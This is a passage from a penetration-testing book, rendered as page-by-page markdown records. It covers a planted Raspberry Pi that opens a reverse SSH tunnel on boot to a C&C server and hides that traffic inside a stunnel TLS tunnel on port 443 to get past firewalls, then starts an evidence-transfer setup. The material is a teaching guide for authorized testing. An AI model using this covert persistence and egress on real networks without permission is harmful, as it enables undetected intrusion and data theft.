- pgno: 70
  md: "Now that we have the `ssh` tunnels built and working without any input, we\
    \ want to work on hiding all this traffic within a TLS tunnel. There are lots\
    \ of security devices that may filter SSH outbound or may raise some additional\
    \ flags. Fortunately, SSL/TLS is typically allowed through firewalls, so having\
    \ the traffic flow through a SSL/TLS tunnel would be an added bonus. Luckily,\
    \ stunnel is a great utility to use for this purpose. Now, let me demonstrate\
    \ how I can set up stunnel and get it working before we tie it all together. But\
    \ before we get to stunnel, we have to make sure that our ssh connection will\
    \ launch on startup so that we can reverse-ssh at any time:\n\n+   1. First, let's\
    \ navigate to the `if-up.d` directory. I will create a file in that directory\
    \ that will execute on startup. I will call this file `outbound-ssh`, and make\
    \ sure that its executable with the `-x` flag. Finally, I will edit the file.\
    \ In my case, I will be using `vi`:\n+   2. Then, I just need to create the script\
    \ within the file that will execute:\n+   3. There are lots of options in terms\
    \ of how to get this script to run on boot. I insert the command in the `/etc/rc.local`\
    \ so that it boots on startup. I just call the script as-is:\n+   \n+   `/root/outbound-ssh`\n\
    \n```\nroot@pi-kali:~# cd /etc/network/if-up.d/\nroot@pi-kali:/etc/network/if-up.d#\
    \ touch outbound-ssh\nroot@pi-kali:/etc/network/if-up.d# chmod +x outbound-ssh\n\
    root@pi-kali:/etc/network/if-up.d# vi outbound-ssh\n```\n\n```\n#!/bin/sh\n\n\
    su -c \"/usr/bin/ssh -p 8888 -f -N -R 8022:127.0.0.1:22 localhost\"\n```"
  merge: -1
  img_proc: true
- pgno: 71
  md: '# stunnel to the rescue


    What stunnel is, basically is an application/utility that provides SSL/TLS-based
    tunnels. It allows us to specify what traffic we want to be tunneled over these
    SSL/TLS-based tunnels. This is the perfect solution for our needs. stunnel does
    involve setup on both sides to work, so let me show you how to configure both
    sides of the stunnel tunnel.


    Setting up stunnel can be a little complicated the first time you go through it
    due to the mix of ports and IPs. You may need to diagram it out just to make sure
    that you have the correct port and IPs in the right location. Let me start with
    the C&C server, which will be our stunnel server. I am assuming stunnel is already
    installed, just not configured.


    +   1. First, I need to set up the certificates for the encryption between the
    client and server. We will use `openssl` to generate the certificates and then
    combine them into a single `.PEM` file:


    ```

    root@kali:~# openssl genrsa 2048 > /etc/stunnel/stunnel.key

    Generating RSA private key, 2048 bit long modulus

    ............................................................................

    ............................................................................

    +++

    e is 65537 (0x10001)

    root@kali:~# openssl req -new -key /etc/stunnel/stunnel.key -x509 -days 200 -out
    /etc/stunnel/stunnel.crt

    You are about to be asked to enter information that will be incorporated

    into your certificate request.

    What you are about to enter is what is called a Distinguished Name or a DN.

    There are quite a few fields but you can leave some blank

    For some fields there will be a default value,

    If you enter ''.'', the field will be left blank.

    -----

    Country Name (2 letter code) [AU]:US

    State or Province Name (full name) [Some-State]:PA

    Locality Name (eg, city) []:Pittsburgh

    Organization Name (eg, company) [Internet Widgits Pty Ltd]:Pentest Services

    Organizational Unit Name (eg, section) []:IT

    Common Name (e.g. server FQDN or YOUR name) []:CCserver

    Email Address []:test@pentest.com

    root@kali:~# cat /etc/stunnel/stunnel.crt /etc/stunnel/stunnel.key > /etc/stunnel/stunnel.pem

    ```'
  merge: -1
  img_proc: true
- pgno: 72
  md: '2. Next, we will make sure that we enable stunnel:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_72_0.png)


    3. Configuring the stunnel configuration file is probably the hardest task in
    this entire step. There is not a whole lot of configuration we need to put in
    there; however, what we do put in there is some minimal requirements.


    4. Within the configuration file, I need to make sure that stunnel knows this
    is the server and not the client. This is accomplished with the following parameter::


    ```

    client = no

    ```


    5. I also need to let stunnel know where the certificate resides within the cert
    parameter:


    ```

    cert = /PATH/TO/CERT

    ```


    6. Telling stunnel what server and port to listen on is very important. This needs
    to be set using the Accept parameter. In my case, this will be port 443 and the
    IP address of the interface we plan to use:


    ```

    Accept = 192.168.33.27:443

    ```


    7. Finally, the use of the Connect parameter will tell stunnel where to send the
    traffic:


    ```

    Connect = 127.0.0.1:22

    ```'
  merge: -1
  img_proc: true
- pgno: 73
  md: '```

    root@kali:/etc/stunnel# cat stunnel.conf

    debug = debug

    output = /var/log/stunnel.log

    [ssh]

    accept = 192.168.33.27:443

    connect = 127.0.0.1:22

    cert = /etc/stunnel/stunnel.pem

    ```


    That is all the configuration that needs to be performed on the server side. Once
    the client side gets set up, we can test the whole process. Make sure that you
    restart the stunnel service on the C&C server to take the new settings:


    ```

    service stunnel4 restart

    ```


    If you are running a piece of firewall software on either the C&C server or the
    Raspberry Pi, you will need to make sure that you have the correct firewall holes
    open on the firewall for stunnel and the reverse SSH tunnel.


    # stunnel setup on the client – Raspberry Pi


    Setting up the client side of the stunnel tunnel is very easy. The hardest part
    again is understanding what to put in the Accept and Connect parameters. Again,
    I will assume that the stunnel package has already been installed on the Raspberry
    Pi.


    +   1. Copy the `stunnel.pem` file from the C&C server over to the Raspberry Pi.

    +   2. Edit the `stunnel.conf` file to reflect the accept and connect IP/Port
    information as well as letting stunnel know this is a client. This file should
    be located in `/etc/stunnel/stunnel.conf`. You want to make sure that you set
    the client to yes since the Pi will act as a client. The accept will be the localhost
    port you will connect to bring up the tunnel; in this case, this is the ssh session
    I specify in the startup script. The connect will be the other end of the stunnel
    tunnel on port 443, since we are using the SSL tunnel to hide this ssh traffic
    in:


    ```

    root@pi-kali:~# cat /etc/stunnel/stunnel.conf

    [ssh]

    cert = /etc/stunnel/stunnel.pem

    client = yes

    accept = 127.0.0.1:8888

    connect = 192.168.33.27:443

    ```'
  merge: -1
  img_proc: true
- pgno: 74
  md: '3. Restart stunnel on the Raspberry Pi. This will make sure the updates that
    were just made will take effect:


    ```

    service stunnel4 restart

    ```


    4. Now, we just need to make sure that stunnel will start on boot up as well:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_74_0.png)


    Now, everything should be set up and running. However, we need to test to make
    sure that all this gets set back up automatically following a reboot of the Raspberry
    Pi, since that will be tucked away within the environment you are performing the
    penetration test on, and you most likely will not have access to it.


    # Verifying automation


    Verifying that everything works as planned is crucial to the success of the penetration
    test. The way that I test is to reboot the Raspberry Pi, or whatever your internal
    server is, to simulate a power outage within the organization.


    To make sure that everything is working as planned, I start with a tcpdump running
    on the C&C server. This tcpdump will look for SSL traffic coming over the stunnel
    tunnel:


    ```

    tcpdump host 192.168.33.123

    ```'
  merge: -1
  img_proc: true
- pgno: 75
  md: '![](img/095df2cd1930baecbcecaa51ee3417aa_75_0.png)


    The host IP that I am using is the IP address of the internal server. Depending
    on whether this host is performing other tasks, you may have to refine the filter
    a little bit more.


    Now, it is time to reboot the Raspberry Pi and make sure that everything works.
    Since you have the tcpdump running, you should see some traffic hit the filter
    after about a minute or so after the reboot, as the Raspberry Pi boots quite quickly.
    If successful, you should see the following screen:


    ![](img/095df2cd1930baecbcecaa51ee3417aa_75_1.png)


    If you didn''t see anything hit the filter, all may not be lost just yet. The
    final verification is that you can hit that reverse ssh tunnel from the C&C server
    back through the stunnel tunnel to the inside Pi. On the C&C server, I will run
    the following ssh command to use this reverse tunnel:


    ```

    ```bash

    Ssh -p 8022 localhost

    ```

    ```


    If everything works as planned, you should see the login prompt for the Raspberry
    Pi.


    # Automating evidence collection


    The last thing you want to do in a penetration test is make it difficult to transfer
    the data over that newly formed stunnel tunnel. Because of this, having a tool
    you can run that will just copy the files over your request is key. In my case,
    I tend to use a script that will send the files over to the correct directory
    on my C&C server. We can run this script whenever we have evidence to move over.'
  merge: -1
  img_proc: true
- pgno: 76
  md: 'My default setup on the Raspberry Pi and C&C server is as follows. Feel free
    to change the directories to whatever works best for you:


    +   1. On the internal server (Raspberry Pi), create the evidence folder in /var
    and, within this directory, create a file called LOG. Make sure that the log file
    is writable:

    +   2. Now that the evidence directory is all set, we just need to create the
    script. I placed the script in /root/scripts on the Raspberry Pi. After creating
    the script, make sure you make it executable:


    ```

    root@pi-kali:~# cd /var

    root@pi-kali:/var# mkdir evidence

    root@pi-kali:/var# touch evidence/LOG

    root@pi-kali:/var# chmod +w evidence/LOG

    root@pi-kali:/var# ls -al evidence/

